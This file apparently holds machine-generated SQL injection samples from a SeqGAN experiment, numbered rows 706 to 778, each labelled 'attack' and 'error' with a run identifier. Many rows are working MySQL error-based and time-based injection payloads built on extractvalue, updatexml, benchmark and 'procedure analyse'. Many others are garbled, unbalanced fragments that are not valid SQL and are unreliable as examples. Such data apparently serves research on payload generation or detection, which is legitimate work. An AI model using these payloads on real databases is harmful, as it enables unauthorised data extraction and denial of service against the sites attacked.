attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,706
attack,"select   (  utl  1759  (  (  0x2e,0x7171706a71,  (  =  (  1297,concat  (  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,0x7171706a71,  (  (  select   (  elt  7982  =  (  0x2e,concat  (  (  0x2e,0x7171706a71,  (  9627,md5  (  (  0x5c,0x7171706a71,  (  select   (  9490  )  (  (  0x5c,0x7171706a71,  (  select   (    (  elt  (  3393  =  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,707
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,708
attack,"1%'  =  'kthen 8841 else cast  (  (  (  select   (  (  el  (  3393  =  3393,  (  (  5000000,md5  (  1049  =  (  (  1297,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  0x52515a50   )    (  (  select   (  5847  (  (  0x2e,0x7171706a71,  (  benchmark  (  5000000,md5  (  0x2e,md5  (  (  0x5c,(  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,709
attack,"exx  extractvalue  (  5000000,md5  (  0x2e,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  (  1297  =  (  (  (  (  0x5c,  (  benchmark  (  5000000(  (  (  0x4b774c75   end  (  elta  (  elt  (  elt  (  0x2e,0x7171706a71,  (  =  (  0x5c,  (  1808,  (  (  (  5000000,md5  =  (  (  1808,0x717a767a71   (  (  (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,710
attack,"1% where Dupdatexmls_(  (  (  5000000,md5  (  1808,1   (  extractvalue  (  (  1808,concat  (  (  (  select   (  el  (  8862  =  (  0x5c,0x7171706a71,  (  (  5000000,0x7171706a71(  (  (  0x2e,0x7171706a71,  (  (  9627,concat  (  (  (  0x5c,concat  (  (  select   (  elt  (  elt  (  (  7982  =  (  3393,2162  =  (  8862,concat  (  (  0x2e,0x7171706a71,  (  =  (  9627,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,711
attack,"1'  )  select   (  6461  )  (  (  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt0 altal  )  e)  )  4415  (  (  3393,concat  (  (  0x4b774c75   (  ual  )   (    (  (  (  elt  (  1808  =  (  7982,1   (  * extractvalue  (  (  (  benchmark  (  2917,1   (  case from 0 else a  (  (   (  (  (  elt  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,712
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,713
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,714
attack,"1%""   or extractvalue  (  (  1808,concat  (  0x2e,0x7171706a71,  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  )   SELECT as  (  (  e  (  elt  (  elt  (  1297  =  1808,1   )    )    ""  =  ""$ant  )  select 0 d a  1724  )  (  (  (  7982  =  (  (  (  0x5c,0x7171706a71,  (  (  9255,concat  (  (  (  0x4b774c75   (  3863  (  (  5777  (  0x5c,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,715
attack,"1% or extractvalue  (  (  (  (  2917,concat  (  0x5c,  (  (  (  (  5000000,md5  (  (  (  select   (  (  e  (  elt  (  e(  elt  (  benchmark  (  elt  (  0x2e,I  (  (  (  select   (  elt  (  elt  =  3393,1   )    )  (  extractvalue  (  (  benchmark  (  (  (  1808,1   from dual  )   end  (  (  el_inal  )  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,716
attack,"1%""  )    #",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,717
attack,"%1%%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,718
attack,"select   (  )  case when   SELECT du 4660   (  (  (  4415   (  (  (  8375  =  (  1808,1   )    )       extractvalue  (  (  (  benchmark  (  (  1808,1   )    (  extractvalue  (  (  9627,concat  (  (  (  9627,md,m5  (  (  3393,1   )    (  extractvalue  (  (  (  7982,0x7171706a71,  (  0x5c,  (  9788(  (  (  benchmark  (  (  5000000(  0x2e,md5  (  0x2e,0x7171706a71,  (  benchmark  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,719
attack," AND 1 or extractvalue  (  (  (  (  (  (  1808,md5  (  (  0x5c,  (  1   (  (  )  elt  (  1808  =  (  3393,mmd5  (  1297,concat  (  (  (  8862,md5  (  (  (  0x2e,md5  (  9788  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  2917  =  (  7982,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,720
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,721
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,722
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,723
attack,"1 pfrom d   (  (  )   (  8375  (  (  elt  (  1808  =  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  (  6461  =  (  (  (  0x5c,  (  =  (  5000000,md5  (  0x5c,  (  (  (  select   (  elt  (  elt  (  1297  =  (  0x2e,  (  select   (  el  (  ut  )  3393  =  (  9083  =  (  (  7982,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,724
attack,"1%""   )    )    AND 'i'  =  updatexml  (  7982,concat  (  (  (  (  (  (  select   (  elt  (  elt  (  7982  =  (  1759(  (  (  1808  =  (  (  select   (  elt  (lt  e  (  (  (  select   (  elt  (  elt  (  0x5c,  (  select   (  elt  (  e  (  1808  =  (  3393,1   from dual  =  el b  elt  (  e  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,725
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,726
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,727
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'knn1161nngxlymemw'  =  'yse    (     (    (  select   (  (  e  (  elt  (  elt  0x2e,md5  (  (  0x5c,0x7171706a71,1   from du 0 from 0 from d5  (  4688  )  8862,1   from d5  (  (  elt  elt  (  3393  =  (  0   (  extractvalue  (  (  9627,concat  (  0x5c,md5  (  =  ut  (  79822768d5  (  (  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,728
attack,"select   (  1812  (  (   (  5847  (  5000000(  3393  =  8403  (  (  1759  (  (  (  0x4b774c75   end  (  (   (  6166  (  (  (  7982  =  (  3393,  (  benchmark  (  (  5000000,m5  (  (  5000000,md5  (  (  (  select   (  eltua   c dua  el  elt  (  7982  =  3393,  (  benchmark  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,729
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,730
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,731
attack,"""   )    (  extractvalue  (  (  ooeSELECT nalytalde  (  case  =  6212  utcase when   (  7982,  (  (  0x5c,  (  5000000(  (  0x2e,5  (  (  1808  =  (  (  0x5c,0x7171706a71,  (  select   (  (  eltelt  (  elt  (  select   (  elt  (  1808  =  1   (  case  =  1802  (   SELECT du d 0 0 from dual  )  5423  )   (  6200  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,732
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,733
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,734
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,735
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,736
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,737
attack,"1%""   )    )     (  8083  0x52515a50   )    (  6369  =  3933 extractvalue  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  5000000(  (  =  (  (  3393,concat  (  (  =  (  (  0x5c,0x7171706a71,  (  t  (  5000000(  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  0x4b774c75   (  case 0 from d5 duanal  )  )n2914   end  (  (  elt  elt  (  1297  =  (  (  1297,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,738
attack,"1%""   )    ) AND AND 'i'  )  1  (  (  select 9103  (  (  =  (  (  (   SELECT int  (  elt  (  1808  =  (    (  (  (  (  3393,1   )    (  extractvalue  (  (  9627,concat  (  1808 0 d5  (  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  t  (  (  50000000x7171706a71,0x7171706a71(  (  (  benchmark  (  (  select   (  elt  (  el  0x52515a50   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,739
attack,"1%""   (  extractvalue  (  (  1759(  (  (  (  2917  (  7744  (  (  (  (  (  (  (   from du 0dual  )   end  (  elt  (  elt  (  1808  =  (  0x5c,md5  (  (  2917  =  3393,1   (  4125  (  1808,1   )    (  extractvalue  (  (  'a  (  benchmark  (  5000000,md50x4b774c75   end  (  (  elt  (  3393  =  (  (  1297,6461  (  0x2e,(  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,740
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,741
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,742
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kAND      )    updatexml'i'  (  9627,m(  (  (  benchmark  (  (  5000000,md5  (  =  (  (  7982  =  (  (  (  0x5c,  (  select   (  elt  (  0x5c,0x7171706a71,  (  (  (  9627,concat  (  (  (  (  0x4b774c75   end  (  (  elt  (  2917  =  (  (  0x5c,  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,743
attack,"1 or extractvalue  (  3393,md5  (  select   (  6461  =  (  4688  )   (    4688  (   (  3863  (  (  elt  (  (  e  1808  =  (  7982,1   (  extractvalue  (  9627,concat  (  (  0x2e,md5  (  (  9788(  (  0x5c,0x7171706a71,  (  (  3393,  (  3393,md5  (  (  (  7982  =  (  (  (  3393  (  0x2e,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,744
attack,"1%""   )    AND proceaddre  (  elt  (  elt  (  e  0x4b774c75   (  (  )   from   (  1812  (  e  (  el  (  1808  =  (  (  select   (  case when   (  2768  (   (  (  )   (  6560  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  3393  =  (  (  0x5c,0x7171706a71,  (  (  (  benchmark  (  5000000(  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,745
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,746
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,747
attack,"1 and extractvalue  (  (  (  (  (  5989  (  3393,concat  (  0x5c,0x7171706a71,  (  (  (  select   (  elt  (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  select   (  4415  =  (  3393,1   )    )     (  extractvalue  (  (  9627,1   )    (  select   (  1812 0 from from   (  6581  (  0x5c,  (  select   (  (  e  (  elt  (  0x5c,0x7171706a71,  (  select   (  elt  e  (  1297  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,748
attack,"71511  )extractvalueextractvalue  (  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  (  0x2e,0x7171706a71,  (  (  (  0x2e,  (  (  (  (  (  benchmark  (  benchmark  (  (  (  5000000(  (  (  (  (  (  (  0x2e,md5  (  (  (  0x2e,0x7171706a71,  (  select   (  (  1808  =  (  3335  1808,md5  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  select   (  elt  (  3393  =  (  (  0x5c,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,749
attack,"1 or extractvalue  (  3393,concat  (  (  (  0x52515a50   (  (  elte  (  elt  (  3393  =  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  (  5000000,md5  (  (  0x5c,  (  5000000(  (  0x2e,m(  (  (  (  select   (  (  elt  (  1808  =  (  0x2e,md5  (  7982  =  (  (  (  3393  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,750
attack,"1%""   )    )    AND 1  extractvalue  (  (  (  3393,concat  (  1759(  (  1759  (  (  0x5c,0x7171706a71,  (  (  (  (  (  (  benchmark  (  (  (  (  5000000,md5  (  (  (  =  (  (  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  (  (  1808  =  (  1297,1   )    (  extractvalue  (  (  9627,concatt  (  (  =  (  5777  (  9788,1   )    (  extractvalue  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,751
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""okron b anadoree  (  8375  =  (  3393,0x7171706a71,  (  (  0x5c,md5  (  0x2e,m5  (  (  0x4b774c75   (  5198  (  (  case  =  (  0x2e,0x7171706a71,  (  (  9627,  (  (  (  select   (  elt  (  1297,1   from d 0 from 0 fromd 0 0 from dual  )  )   end  (  (  elte  )  elt  (  3576  =  7982,1   and ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,752
attack,"""  =  9083  =  1 extractvalue  (  (  (  (  (  (  (  (  (  (  (  1759  (  (  (  (  =  (  3393,concat  (  (  (  (  =  (  3393,  (  5000000(  (  (  0x4b774c75   (  (  elt  )  e  (  0x5c,  (  (  =  (  2917,1   )    (  extractvalue  (  9627,concat  (  0x2e,md5  (  (  (  0x2e,0x7171706a71,  (  t  (  (  benchmark  (  (  5000000,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,753
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,754
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,755
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,756
attack,"1%"" and updatexml  (  (  (  (  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  elt  (  0x2e,m5  (  (  =  (  7982,  (  5000000,md5  (  (  =  1297,1   from dual  )  )  )   end  (  elt  (  elt  (  select   (  (  elt  (  1808  =  (  2518  I  ,  (  1297  =  (  (  select   (  el  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,757
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,758
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,759
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,760
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,761
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""AM,     )  4968  =  'i proce anal  )  )  el  )  0x5c,  (  (  select   (  (  elt  (  elt  (  1297  =  (  0x2e,md5  (  select   (  (  elt    (  0x2e,md5  (  0x2e,md5  (  0x5c,  (  benchmark  (  (  5000000,md5  (  (  0x5c,  (  (  (  t  (  5000000,md5  (  2446  (  0x2e,md5  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,762
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,763
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,764
attack,"""   and extractvalue  (  (  ((  e  (  1808  =  ut  (  5000000,md5  ut  (  benchmark  (  (  e  (  benchmark  (  5000000(  0x4b774c75   (  4415  (  e(  0x4b774c75   )    (  extractvalue  (  9627,concat  (  (  (  0x5c,0x7171706a71    (  benchmark  (  (  benchmark  (  (  5000000,md5  (  1 as duanal  )   end  (  (  elta  )  el  (  0x2e,md5  (  (  (  0x5c,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,765
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,766
attack,"1%"" and extractvalue  (  (  (  (  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  el  (  2917  =  (  0x2e,0x7171706a71,  (  select   (  elt  1297l_  (  0x5c,0x7171706a71,  (  select   (  elt  (  1808  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  (  select   (  6166  =  8862,1   (  8375  (  (  0x2e,0x7171706a71,  (  select   (  elta  )  2917  =  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,767
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,768
attack,",(  (  (  select   (  el_alance  6166  =  (  (  (   e  (  (  elt  (  1297  =  (  3393,  (  (  select   (lt  (  elt  (  3393  =  (  0x2e,0x7171706a71,  (  (  select   (  )  elt  (  e  (  0x2e,concat  (  =  (  (  0x5c,  (  =  (  9627,concat  (  (  (  (  0x5c,  (  (  select   (  elt  (  elt  (  e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,769
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,770
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,771
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,772
attack,"1%""   )    )     extractvalue  (  9627,md5  (  =  6212  (  (  7982,1   from dual  )   end  (  (  elt  elt  (  5198  =  3393,1   )    (  select   (  (  elt  7982  =  (  (  0x5c,  (  (  0x5c,0x7171706a71,  (  9627,md5  (  select   (  elt  (  elt  (  7982  =  6581  (  0x5c,  (  (  5000000(  (  (  0x2e,0x717a767a71  (  select   (  case when",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,773
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,774
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,775
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,776
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,777
attack,"1%""   )    )    AND iqST  I  select   (  extractvalue  (  (  9788,1   )    )    AND 'i'  =  4968  =  extractvalue  (  (  3393,concat  (  (  =  (  7982,1   )    (  extractvalue  (  benchmark  (  (  2917,1,0x7171706a71(  (  (  5000000,md5  (  (  1759  (  (  1808,concatt  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  5000000,md5  (  t  (  (  3393  =  (  (  3393  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,778
